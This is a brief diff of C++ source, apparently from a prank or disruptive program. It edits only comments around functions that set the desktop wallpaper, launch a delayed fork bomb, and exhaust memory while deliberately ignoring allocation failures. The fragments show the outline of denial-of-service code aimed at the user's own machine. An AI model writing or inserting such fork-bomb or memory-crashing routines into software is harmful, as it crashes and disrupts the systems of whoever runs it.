@@ -209,7 +209,7 @@ void SetWallpaper(const char* path)
 	SystemParametersInfoA(SPI_SETDESKWALLPAPER, 1, (PVOID)(pth.substr(0, pth.find_last_of("\\/")) += (std::string("\\") += path)).c_str(), SPIF_SENDCHANGE | SPIF_UPDATEINIFILE);
 }
 
-/* Waits for <delay> seconds before running a fork bomb. If <memcrash>, an insanely large array is created as well. */
+/* Waits for <delay> seconds before running a fork bomb. */
 void ForkBomb(double delay = 0.0)
 {
 	const Timer timer;
@@ -230,7 +230,7 @@ void MemCrash(double delay = 0.0)
 			__memcrasher* fbc{ new __memcrasher };
 		}
 
-		catch (std::bad_alloc& ba)
+		catch (std::bad_alloc& ba) // purposefully do absolutely nothing when allocation fails
 		{
 
 		}
